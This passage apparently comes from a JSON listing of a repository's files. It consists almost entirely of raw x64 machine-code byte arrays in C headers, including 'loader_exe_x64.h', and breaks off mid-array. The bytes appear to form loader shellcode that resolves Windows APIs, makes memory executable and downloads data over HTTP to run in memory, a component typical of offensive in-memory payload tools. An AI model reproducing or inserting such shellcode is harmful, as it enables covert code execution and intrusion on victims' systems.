0x45, 0xe8, 0xe9, 0x58, 0x01, \n  0x00, 0x00, 0x48, 0x8b, 0x45, 0xe0, 0x44, 0x0f, 0xb6, 0x18, 0x48, 0x03, \n  0xc6, 0x41, 0x8b, 0xcb, 0x48, 0x89, 0x45, 0xe0, 0x23, 0xce, 0x83, 0xc1, \n  0x02, 0x41, 0xd1, 0xeb, 0x74, 0x21, 0x48, 0x8b, 0x55, 0xe8, 0x45, 0x8b, \n  0xc3, 0x49, 0xf7, 0xd8, 0x41, 0x8a, 0x04, 0x10, 0x88, 0x02, 0x48, 0x03, \n  0xd6, 0x41, 0x03, 0xce, 0x75, 0xf2, 0x48, 0x89, 0x55, 0xe8, 0xe9, 0xfc, \n  0x00, 0x00, 0x00, 0x8b, 0xfe, 0xe9, 0xf5, 0x00, 0x00, 0x00, 0x44, 0x8b, \n  0xd6, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, 0x32, 0x01, 0x00, 0x00, 0x48, 0x8d, \n  0x4d, 0xe0, 0x46, 0x8d, 0x14, 0x50, 0xe8, 0x25, 0x01, 0x00, 0x00, 0x85, \n  0xc0, 0x75, 0xe6, 0x45, 0x85, 0xc9, 0x75, 0x48, 0x41, 0x83, 0xfa, 0x02, \n  0x75, 0x42, 0x44, 0x8b, 0xce, 0x48, 0x8d, 0x4d, 0xe0, 0xe8, 0x0a, 0x01, \n  0x00, 0x00, 0x48, 0x8d, 0x4d, 0xe0, 0x46, 0x8d, 0x0c, 0x48, 0xe8, 0xfd, \n  0x00, 0x00, 0x00, 0x85, 0xc0, 0x75, 0xe6, 0x45, 0x85, 0xc9, 0x0f, 0x84, \n  0xa7, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0xe8, 0x41, 0x8b, 0xd3, 0x48, \n  0xf7, 0xda, 0x8a, 0x04, 0x0a, 0x88, 0x01, 0x48, 0x03, 0xce, 0x45, 0x03, \n  0xce, 0x75, 0xf3, 0xe9, 0x87, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x4d, 0xe0, \n  0x44, 0x33, 0xce, 0x45, 0x2b, 0xd1, 0x44, 0x8b, 0xce, 0x41, 0xc1, 0xe2, \n  0x08, 0x44, 0x0f, 0xb6, 0x19, 0x41, 0x81, 0xc3, 0x00, 0xfe, 0xff, 0xff, \n  0x45, 0x03, 0xda, 0x48, 0x03, 0xce, 0x48, 0x89, 0x4d, 0xe0, 0x48, 0x8d, \n  0x4d, 0xe0, 0xe8, 0xa5, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x4d, 0xe0, 0x46, \n  0x8d, 0x0c, 0x48, 0xe8, 0x98, 0x00, 0x00, 0x00, 0x85, 0xc0, 0x75, 0xe6, \n  0x41, 0x81, 0xfb, 0x00, 0x7d, 0x00, 0x00, 0x41, 0x8d, 0x41, 0x01, 0x41, \n  0x0f, 0x42, 0xc1, 0x41, 0x81, 0xfb, 0x00, 0x05, 0x00, 0x00, 0x8d, 0x48, \n  0x01, 0x0f, 0x42, 0xc8, 0x41, 0x81, 0xfb, 0x80, 0x00, 0x00, 0x00, 0x44, \n  0x8d, 0x41, 0x02, 0x44, 0x0f, 0x43, 0xc1, 0x45, 0x85, 0xc0, 0x74, 0x1b, \n  0x48, 0x8b, 0x4d, 0xe8, 0x41, 0x8b, 0xd3, 0x48, 0xf7, 0xda, 0x8a, 0x04, \n  0x0a, 0x88, 0x01, 0x48, 0x03, 0xce, 0x45, 0x03, 0xc6, 0x75, 0xf3, 0x48, \n  0x89, 0x4d, 0xe8, 0x44, 0x8b, 0xce, 0xeb, 0x1d, 0x48, 0x8b, 0x55, 0xe0, \n  0x48, 0x8b, 0x4d, 0xe8, 0x8a, 0x02, 0x88, 0x01, 0x48, 0x03, 0xce, 0x48, \n  0x03, 0xd6, 0x48, 0x89, 0x4d, 0xe8, 0x48, 0x89, 0x55, 0xe0, 0x45, 0x33, \n  0xc9, 0x85, 0xff, 0x0f, 0x84, 0x20, 0xfe, 0xff, 0xff, 0x8b, 0x45, 0xe8, \n  0x48, 0x8b, 0x74, 0x24, 0x58, 0x2b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x50, \n  0x48, 0x8b, 0x7c, 0x24, 0x60, 0x4c, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83, \n  0xc4, 0x40, 0x5d, 0xc3, 0x8b, 0x51, 0x14, 0x4c, 0x8d, 0x41, 0x10, 0x8d, \n  0x42, 0xff, 0x89, 0x41, 0x14, 0x85, 0xd2, 0x75, 0x17, 0x48, 0x8b, 0x11, \n  0x0f, 0xb6, 0x02, 0x41, 0x89, 0x00, 0x48, 0x8d, 0x42, 0x01, 0x48, 0x89, \n  0x01, 0xc7, 0x41, 0x14, 0x07, 0x00, 0x00, 0x00, 0x41, 0x8b, 0x00, 0x8d, \n  0x0c, 0x00, 0xc1, 0xe8, 0x07, 0x83, 0xe0, 0x01, 0x41, 0x89, 0x08, 0xc3, \n  0x4c, 0x8b, 0xc9, 0x45, 0x85, 0xc0, 0x74, 0x13, 0x48, 0x2b, 0xd1, 0x42, \n  0x8a, 0x04, 0x0a, 0x41, 0x88, 0x01, 0x49, 0xff, 0xc1, 0x41, 0x83, 0xc0, \n  0xff, 0x75, 0xf0, 0x48, 0x8b, 0xc1, 0xc3, 0xcc, 0x48, 0x89, 0x7c, 0x24, \n  0x08, 0x4c, 0x8b, 0xc9, 0x8a, 0xc2, 0x49, 0x8b, 0xf9, 0x41, 0x8b, 0xc8, \n  0xf3, 0xaa, 0x48, 0x8b, 0x7c, 0x24, 0x08, 0x49, 0x8b, 0xc1, 0xc3, 0xcc, \n  0xeb, 0x0f, 0x80, 0x3a, 0x00, 0x74, 0x10, 0x3a, 0x02, 0x75, 0x0c, 0x48, \n  0xff, 0xc1, 0x48, 0xff, 0xc2, 0x8a, 0x01, 0x84, 0xc0, 0x75, 0xeb, 0x0f, \n  0xbe, 0x01, 0x0f, 0xbe, 0x0a, 0x2b, 0xc1, 0xc3, 0xeb, 0x19, 0x44, 0x8a, \n  0x02, 0x45, 0x84, 0xc0, 0x74, 0x17, 0x41, 0x80, 0xc8, 0x20, 0x0c, 0x20, \n  0x41, 0x3a, 0xc0, 0x75, 0x0c, 0x48, 0xff, 0xc1, 0x48, 0xff, 0xc2, 0x8a, \n  0x01, 0x84, 0xc0, 0x75, 0xe1, 0x0f, 0xbe, 0x01, 0x0f, 0xbe, 0x0a, 0x2b, \n  0xc1, 0xc3};\n\n"
        },
        {
          "name": "loader_exe_x64.h",
          "type": "blob",
          "size": 82.0087890625,
          "content": "\nunsigned char LOADER_EXE_X64[] = {\n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, \n  0x74, 0x24, 0x18, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x81, 0xec, 0x00, \n  0x05, 0x00, 0x00, 0x33, 0xff, 0x48, 0x8b, 0xd9, 0x39, 0xb9, 0x38, 0x02, \n  0x00, 0x00, 0x0f, 0x84, 0xce, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0x41, 0x28, \n  0x48, 0x8b, 0x91, 0x88, 0x00, 0x00, 0x00, 0xe8, 0x34, 0x2e, 0x00, 0x00, \n  0x48, 0x85, 0xc0, 0x0f, 0x84, 0xaf, 0x00, 0x00, 0x00, 0x48, 0x21, 0x7c, \n  0x24, 0x28, 0x4c, 0x8d, 0x05, 0x77, 0x13, 0x00, 0x00, 0x21, 0x7c, 0x24, \n  0x20, 0x4c, 0x8b, 0xcb, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0xd0, 0x4c, 0x8b, \n  0x43, 0x28, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x93, 0x08, 0x02, 0x00, 0x00, \n  0x48, 0x8b, 0xf8, 0xe8, 0xfc, 0x2d, 0x00, 0x00, 0x4c, 0x8b, 0x43, 0x28, \n  0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x93, 0xa0, 0x00, 0x00, 0x00, 0x4c, 0x8b, \n  0xf0, 0xe8, 0xe6, 0x2d, 0x00, 0x00, 0x4c, 0x8b, 0x43, 0x28, 0x48, 0x8b, \n  0xcb, 0x48, 0x8b, 0x93, 0xa8, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0xe8, \n  0xd0, 0x2d, 0x00, 0x00, 0x33, 0xc9, 0x48, 0x8b, 0xe8, 0xff, 0x53, 0x40, \n  0x4c, 0x8b, 0xf8, 0x4d, 0x85, 0xf6, 0x74, 0x4f, 0x48, 0x85, 0xf6, 0x74, \n  0x4a, 0x48, 0x85, 0xed, 0x74, 0x45, 0xc7, 0x44, 0x24, 0x60, 0x0b, 0x00, \n  0x10, 0x00, 0xff, 0xd5, 0x48, 0x8b, 0xc8, 0x48, 0x8d, 0x54, 0x24, 0x30, \n  0xff, 0xd6, 0x8b, 0x83, 0x38, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, \n  0x30, 0x48, 0x83, 0xa4, 0x24, 0xc8, 0x00, 0x00, 0x00, 0xf0, 0x49, 0x03, \n  0xc7, 0x33, 0xd2, 0x48, 0x89, 0x84, 0x24, 0x28, 0x01, 0x00, 0x00, 0x41, \n  0xff, 0xd6, 0xeb, 0x0b, 0x48, 0x83, 0xc8, 0xff, 0xeb, 0x08, 0xe8, 0xc9, \n  0x12, 0x00, 0x00, 0x48, 0x8b, 0xc7, 0x4c, 0x8d, 0x9c, 0x24, 0x00, 0x05, \n  0x00, 0x00, 0x49, 0x8b, 0x5b, 0x20, 0x49, 0x8b, 0x6b, 0x28, 0x49, 0x8b, \n  0x73, 0x30, 0x49, 0x8b, 0xe3, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0xc3, 0xcc, \n  0xf0, 0xff, 0x41, 0x08, 0x8b, 0x41, 0x08, 0xc3, 0xb8, 0x01, 0x40, 0x00, \n  0x80, 0xc3, 0xcc, 0xcc, 0x4d, 0x85, 0xc0, 0x75, 0x06, 0xb8, 0x03, 0x40, \n  0x00, 0x80, 0xc3, 0x4c, 0x8b, 0x49, 0x10, 0x49, 0x8b, 0x81, 0x30, 0x08, \n  0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x0d, 0x49, 0x8b, 0x81, 0x38, 0x08, \n  0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x74, 0x19, 0x49, 0x8b, 0x81, 0xf0, \n  0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x17, 0x49, 0x8b, 0x81, 0xf8, \n  0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x75, 0x0a, 0x49, 0x89, 0x08, \n  0xf0, 0xff, 0x41, 0x08, 0x33, 0xc0, 0xc3, 0x49, 0x83, 0x20, 0x00, 0xb8, \n  0x02, 0x40, 0x00, 0x80, 0xc3, 0xcc, 0xcc, 0xcc, 0x83, 0xc8, 0xff, 0xf0, \n  0x0f, 0xc1, 0x41, 0x08, 0xff, 0xc8, 0xc3, 0xcc, 0x33, 0xc0, 0xc3, 0xcc, \n  0x48, 0x89, 0x5c, 0x24, 0x08, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, \n  0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xf9, 0x41, \n  0x8b, 0xe8, 0x48, 0x8b, 0xf1, 0x41, 0xf6, 0xc0, 0x02, 0x74, 0x1b, 0x48, \n  0x8b, 0x5c, 0x24, 0x50, 0x48, 0x85, 0xdb, 0x74, 0x1c, 0x48, 0x8b, 0x49, \n  0x38, 0x48, 0x8b, 0x01, 0xff, 0x50, 0x08, 0x48, 0x8b, 0x46, 0x38, 0x48, \n  0x89, 0x03, 0x40, 0xf6, 0xc5, 0x01, 0x74, 0x1c, 0x48, 0x85, 0xff, 0x75, \n  0x07, 0xb8, 0x03, 0x40, 0x00, 0x80, 0xeb, 0x12, 0x48, 0x8d, 0x5e, 0x28, \n  0x48, 0x8b, 0x03, 0x48, 0x8b, 0xcb, 0xff, 0x50, 0x08, 0x48, 0x89, 0x1f, \n  0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, \n  0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, \n  0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x41, 0x58, 0x48, 0x8b, \n  0xda, 0xff, 0x50, 0x78, 0x89, 0x03, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, \n  0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x53, 0x48, 0x83, 0xec, 0x60, \n  0x83, 0x60, 0x20, 0x00, 0x48, 0x8d, 0x48, 0xb8, 0x83, 0x60, 0x18, 0x00, \n  0x48, 0x8b, 0xda, 0x83, 0x60, 0x10, 0x00, 0x33, 0xd2, 0x44, 0x8d, 0x42, \n  0x40, 0xe8, 0xbe, 0x31, 0x00, 0x00, 0x48, 0x8b, 0x03, 0x48, 0x8d, 0x54, \n  0x24, 0x20, 0x48, 0x8b, 0xcb, 0xff, 0x50, 0x18, 0x85, 0xc0, 0x75, 0x1e, \n  0x48, 0x8b, 0x03, 0x4c, 0x8d, 0x4c, 0x24, 0x78, 0x4c, 0x8d, 0x84, 0x24, \n  0x80, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xcb, 0x48, 0x8d, 0x94, 0x24, 0x88, \n  0x00, 0x00, 0x00, 0xff, 0x50, 0x20, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x60, \n  0x5b, 0xc3, 0xcc, 0xcc, 0x4d, 0x8b, 0xc8, 0x4d, 0x85, 0xc0, 0x75, 0x06, \n  0xb8, 0x03, 0x40, 0x00, 0x80, 0xc3, 0x4c, 0x8b, 0x41, 0x58, 0x49, 0x8b, \n  0x80, 0x30, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x0d, 0x49, 0x8b, \n  0x80, 0x38, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x74, 0x19, 0x49, \n  0x8b, 0x80, 0xe0, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x16, 0x49, \n  0x8b, 0x80, 0xe8, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x75, 0x09, \n  0x49, 0x89, 0x09, 0xf0, 0xff, 0x41, 0x08, 0xeb, 0x24, 0x49, 0x8b, 0x80, \n  0xf0, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x02, 0x75, 0x1b, 0x49, 0x8b, 0x80, \n  0xf8, 0x08, 0x00, 0x00, 0x48, 0x3b, 0x42, 0x08, 0x75, 0x0e, 0x48, 0x8d, \n  0x41, 0x10, 0x49, 0x89, 0x01, 0xf0, 0xff, 0x41, 0x18, 0x33, 0xc0, 0xc3, \n  0x49, 0x83, 0x21, 0x00, 0xb8, 0x02, 0x40, 0x00, 0x80, 0xc3, 0xcc, 0xcc, \n  0x48, 0x8b, 0x44, 0x24, 0x30, 0x83, 0x20, 0x00, 0x33, 0xc0, 0xc3, 0xcc, \n  0x0f, 0xaf, 0xca, 0x8b, 0xc1, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0x44, 0x24, \n  0x28, 0x83, 0x20, 0x00, 0x33, 0xc0, 0xc3, 0xcc, 0x8d, 0x04, 0x11, 0xc3, \n  0x48, 0x89, 0x5c, 0x24, 0x18, 0x55, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57, \n  0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x91, 0x54, 0x03, 0x00, 0x00, 0x48, \n  0x8b, 0xd9, 0xe8, 0x91, 0x28, 0x00, 0x00, 0x48, 0x8b, 0xf0, 0x48, 0x85, \n  0xc0, 0x75, 0x0a, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xe9, 0xe7, 0x00, 0x00, \n  0x00, 0x4c, 0x8d, 0x83, 0xc8, 0x05, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x48, \n  0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0xe8, 0x52, 0x29, 0x00, 0x00, 0x48, 0x8b, \n  0xe8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xc4, 0x00, 0x00, 0x00, 0x48, 0x8d, \n  0x3d, 0x8f, 0xff, 0xff, 0xff, 0x4c, 0x8d, 0x3d, 0x7c, 0xff, 0xff, 0xff, \n  0x41, 0x2b, 0xff, 0x0f, 0x88, 0xad, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x4c, \n  0x24, 0x50, 0x8b, 0xd7, 0x41, 0xb8, 0x40, 0x00, 0x00, 0x00, 0x44, 0x8b, \n  0xf7, 0x48, 0x8b, 0xc8, 0xff, 0x53, 0x60, 0x85, 0xc0, 0x0f, 0x84, 0x8f, \n  0x00, 0x00, 0x00, 0x44, 0x8b, 0xc7, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xcd, \n  0xe8, 0x2b, 0x30, 0x00, 0x00, 0x44, 0x8b, 0x44, 0x24, 0x50, 0x4c, 0x8d, \n  0x4c, 0x24, 0x58, 0x41, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xff, 0x53, 0x60, \n  0x4c, 0x8d, 0x83, 0xd8, 0x05, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x48, 0x8b, \n  0xd6, 0x48, 0x8b, 0xcb, 0xe8, 0xdb, 0x28, 0x00, 0x00, 0x48, 0x8b, 0xf0, \n  0x48, 0x85, 0xc0, 0x74, 0x51, 0x48, 0x8d, 0x3d, 0x30, 0xff, 0xff, 0xff, \n  0x4c, 0x8d, 0x35, 0x1d, 0xff, 0xff, 0xff, 0x41, 0x2b, 0xfe, 0x78, 0x3e, \n  0x4c, 0x8d, 0x4c, 0x24, 0x50, 0x8b, 0xd7, 0x41, 0xb8, 0x40, 0x00, 0x00, \n  0x00, 0x8b, 0xef, 0x48, 0x8b, 0xc8, 0xff, 0x53, 0x60, 0x85, 0xc0, 0x74, \n  0x25, 0x44, 0x8b, 0xc7, 0x49, 0x8b, 0xd6, 0x48, 0x8b, 0xce, 0xe8, 0xc1, \n  0x2f, 0x00, 0x00, 0x44, 0x8b, 0x44, 0x24, 0x50, 0x4c, 0x8d, 0x4c, 0x24, \n  0x58, 0x8b, 0xd5, 0x48, 0x8b, 0xce, 0xff, 0x53, 0x60, 0xe9, 0x11, 0xff, \n  0xff, 0xff, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x83, 0xc4, \n  0x20, 0x41, 0x5f, 0x41, 0x5e, 0x5f, 0x5e, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, \n  0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x48, \n  0x83, 0xec, 0x20, 0x48, 0x8d, 0x91, 0x68, 0x03, 0x00, 0x00, 0x48, 0x8b, \n  0xd9, 0xe8, 0x66, 0x27, 0x00, 0x00, 0x4c, 0x8d, 0x83, 0xe8, 0x05, 0x00, \n  0x00, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0xd0, 0x48, 0x8b, 0xcb, 0xe8, 0x39, \n  0x28, 0x00, 0x00, 0x48, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x74, 0x42, 0xbe, \n  0x01, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x4c, 0x24, 0x30, 0x8b, 0xd6, 0x48, \n  0x8b, 0xc8, 0x44, 0x8d, 0x46, 0x3f, 0xff, 0x53, 0x60, 0x85, 0xc0, 0x74, \n  0x28, 0x48, 0x8d, 0x93, 0x0c, 0x06, 0x00, 0x00, 0x44, 0x8b, 0xc6, 0x48, \n  0x8b, 0xcf, 0xe8, 0x2d, 0x2f, 0x00, 0x00, 0x44, 0x8b, 0x44, 0x24, 0x30, \n  0x4c, 0x8d, 0x4c, 0x24, 0x38, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xff, 0x53, \n  0x60, 0x8b, 0xc6, 0xeb, 0x02, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, \n  0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, \n  0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, \n  0x57, 0x48, 0x8d, 0xac, 0x24, 0x88, 0xfd, 0xff, 0xff, 0x48, 0x81, 0xec, \n  0x78, 0x03, 0x00, 0x00, 0x45, 0x33, 0xff, 0x48, 0x8b, 0xf9, 0x44, 0x21, \n  0xbd, 0xd8, 0x02, 0x00, 0x00, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0x33, 0xd2, \n  0x33, 0xf6, 0xbb, 0x00, 0x03, 0x60, 0x04, 0x45, 0x8d, 0x77, 0x68, 0x45, \n  0x8b, 0xc6, 0xe8, 0xe1, 0x2e, 0x00, 0x00, 0xb9, 0x04, 0x01, 0x00, 0x00, \n  0x44, 0x89, 0x74, 0x24, 0x60, 0x89, 0x4d, 0x80, 0x48, 0x8d, 0x85, 0x60, \n  0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x78, 0x4c, 0x8d, 0x4c, 0x24, \n  0x60, 0x89, 0x4d, 0xb0, 0x48, 0x8d, 0x45, 0x50, 0x48, 0x89, 0x45, 0xa8, \n  0x8d, 0x4e, 0x40, 0x48, 0x8d, 0x45, 0xd0, 0x89, 0x4d, 0x90, 0x48, 0x89, \n  0x45, 0x88, 0x33, 0xd2, 0x48, 0x8d, 0x45, 0x10, 0x89, 0x4d, 0xa0, 0x48, \n  0x8d, 0x8f, 0x24, 0x09, 0x00, 0x00, 0x48, 0x89, 0x45, 0x98, 0x41, 0xb8, \n  0x00, 0x00, 0x00, 0x10, 0xff, 0x97, 0x48, 0x01, 0x00, 0x00, 0x45, 0x33, \n  0xf6, 0x85, 0xc0, 0x0f, 0x84, 0xd5, 0x03, 0x00, 0x00, 0x83, 0x7c, 0x24, \n  0x74, 0x04, 0xb8, 0x00, 0x33, 0xe0, 0x04, 0x45, 0x8b, 0xe6, 0x44, 0x89, \n  0x74, 0x24, 0x20, 0x41, 0x0f, 0x94, 0xc4, 0x0f, 0x44, 0xd8, 0x45, 0x33, \n  0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x97, 0x50, 0x01, \n  0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x85, 0xc0, 0x0f, 0x84, \n  0x9e, 0x03, 0x00, 0x00, 0x44, 0x0f, 0xb7, 0x45, 0x84, 0x48, 0x8d, 0x95, \n  0x60, 0x01, 0x00, 0x00, 0x4c, 0x89, 0x74, 0x24, 0x38, 0x45, 0x33, 0xc9, \n  0x44, 0x89, 0x74, 0x24, 0x30, 0x48, 0x8b, 0xc8, 0xc7, 0x44, 0x24, 0x28, \n  0x03, 0x00, 0x00, 0x00, 0x4c, 0x89, 0x74, 0x24, 0x20, 0xff, 0x97, 0x58, \n  0x01, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x4c, 0x8b, 0xe8, 0x48, \n  0x85, 0xc0, 0x0f, 0x84, 0x03, 0x03, 0x00, 0x00, 0x44, 0x39, 0x75, 0xb0, \n  0x75, 0x06, 0x66, 0xc7, 0x45, 0x50, 0x2f, 0x00, 0x4c, 0x89, 0x74, 0x24, \n  0x38, 0x4c, 0x8d, 0x45, 0x50, 0x89, 0x5c, 0x24, 0x30, 0x45, 0x33, 0xc9, \n  0x4c, 0x89, 0x74, 0x24, 0x28, 0x33, 0xd2, 0x48, 0x8b, 0xc8, 0x4c, 0x89, \n  0x74, 0x24, 0x20, 0xff, 0x97, 0x80, 0x01, 0x00, 0x00, 0x4c, 0x8b, 0xf0, \n  0x48, 0x85, 0xc0, 0x0f, 0x84, 0xba, 0x02, 0x00, 0x00, 0x45, 0x85, 0xe4, \n  0x74, 0x26, 0x0f, 0xba, 0xe3, 0x0c, 0x73, 0x20, 0x41, 0xb9, 0x04, 0x00, \n  0x00, 0x00, 0xc7, 0x44, 0x24, 0x50, 0x80, 0x33, 0x00, 0x00, 0x4c, 0x8d, \n  0x44, 0x24, 0x50, 0x48, 0x8b, 0xc8, 0x41, 0x8d, 0x51, 0x1b, 0xff, 0x97, \n  0x60, 0x01, 0x00, 0x00, 0x44, 0x8b, 0x4d, 0x90, 0x33, 0xdb, 0x45, 0x85, \n  0xc9, 0x74, 0x12, 0x4c, 0x8b, 0x45, 0x88, 0x8d, 0x53, 0x1c, 0x49, 0x8b, \n  0xce, 0xff, 0x97, 0x60, 0x01, 0x00, 0x00, 0x8b, 0xf0, 0x44, 0x8b, 0x4d, \n  0xa0, 0x45, 0x85, 0xc9, 0x74, 0x14, 0x4c, 0x8b, 0x45, 0x98, 0xba, 0x1d, \n  0x00, 0x00, 0x00, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x60, 0x01, 0x00, 0x00, \n  0x8b, 0xf0, 0x45, 0x33, 0xc9, 0x89, 0x5c, 0x24, 0x20, 0x45, 0x33, 0xc0, \n  0x33, 0xd2, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x88, 0x01, 0x00, 0x00, 0x85, \n  0xc0, 0x0f, 0x84, 0x2f, 0x02, 0x00, 0x00, 0x4c, 0x8d, 0x8d, 0xd0, 0x02, \n  0x00, 0x00, 0xc7, 0x85, 0xd0, 0x02, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, \n  0x4c, 0x8d, 0x85, 0xd8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x5c, 0x24, 0x20, \n  0xba, 0x13, 0x00, 0x00, 0x20, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x90, 0x01, \n  0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xfc, 0x01, 0x00, 0x00, 0x81, 0xbd, \n  0xd8, 0x02, 0x00, 0x00, 0xc8, 0x00, 0x00, 0x00, 0x0f, 0x85, 0xec, 0x01, \n  0x00, 0x00, 0x4c, 0x8d, 0x8d, 0xd0, 0x02, 0x00, 0x00, 0xc7, 0x85, 0xd0, \n  0x02, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x85, 0xc0, 0x02, \n  0x00, 0x00, 0x89, 0x9d, 0xc0, 0x02, 0x00, 0x00, 0xba, 0x05, 0x00, 0x00, \n  0x20, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x49, 0x8b, 0xce, 0xff, 0x97, 0x90, \n  0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0xee, 0x00, 0x00, 0x00, 0xff, \n  0x97, 0xe8, 0x00, 0x00, 0x00, 0x3d, 0x76, 0x2f, 0x00, 0x00, 0x0f, 0x85, \n  0xa2, 0x01, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x89, 0x9d, 0xc0, 0x02, 0x00, \n  0x00, 0x45, 0x33, 0xc0, 0x48, 0x8d, 0x95, 0xc8, 0x02, 0x00, 0x00, 0x49, \n  0x8b, 0xce, 0xff, 0x97, 0x78, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, \n  0x7e, 0x01, 0x00, 0x00, 0x41, 0xbc, 0x01, 0x00, 0x00, 0x00, 0x8b, 0x8d, \n  0xc8, 0x02, 0x00, 0x00, 0x85, 0xc9, 0x0f, 0x84, 0x93, 0x00, 0x00, 0x00, \n  0x48, 0x8b, 0x97, 0xd8, 0x00, 0x00, 0x00, 0x4d, 0x85, 0xff, 0x75, 0x15, \n  0x8b, 0xd9, 0xff, 0xd2, 0x48, 0x8b, 0xc8, 0x44, 0x8b, 0xc3, 0x41, 0x8b, \n  0xd4, 0xff, 0x97, 0xc8, 0x00, 0x00, 0x00, 0xeb, 0x1c, 0x8b, 0x9d, 0xc0, \n  0x02, 0x00, 0x00, 0x03, 0xd9, 0xff, 0xd2, 0x48, 0x8b, 0xc8, 0x44, 0x8b, \n  0xcb, 0x4d, 0x8b, 0xc7, 0x41, 0x8b, 0xd4, 0xff, 0x97, 0xd0, 0x00, 0x00, \n  0x00, 0x33, 0xdb, 0x4c, 0x8b, 0xf8, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0x1f, \n  0x01, 0x00, 0x00, 0x8b, 0x95, 0xc0, 0x02, 0x00, 0x00, 0x4c, 0x8d, 0x4c, \n  0x24, 0x40, 0x44, 0x8b, 0x85, 0xc8, 0x02, 0x00, 0x00, 0x48, 0x03, 0xd0, \n  0x49, 0x8b, 0xce, 0xff, 0x97, 0x68, 0x01, 0x00, 0x00, 0x8b, 0x85, 0xc8, \n  0x02, 0x00, 0x00, 0x48, 0x8d, 0x95, 0xc8, 0x02, 0x00, 0x00, 0x01, 0x85, \n  0xc0, 0x02, 0x00, 0x00, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x49, 0x8b, \n  0xce, 0xff, 0x97, 0x78, 0x01, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x85, 0x5f, \n  0xff, 0xff, 0xff, 0x4c, 0x8d, 0xaf, 0xd8, 0x00, 0x00, 0x00, 0x4d, 0x85, \n  0xff, 0x0f, 0x84, 0xc2, 0x00, 0x00, 0x00, 0xeb, 0x5c, 0x8b, 0x85, 0xc0, \n  0x02, 0x00, 0x00, 0x85, 0xc0, 0x0f, 0x84, 0xb7, 0x00, 0x00, 0x00, 0x4c, \n  0x8d, 0xaf, 0xd8, 0x00, 0x00, 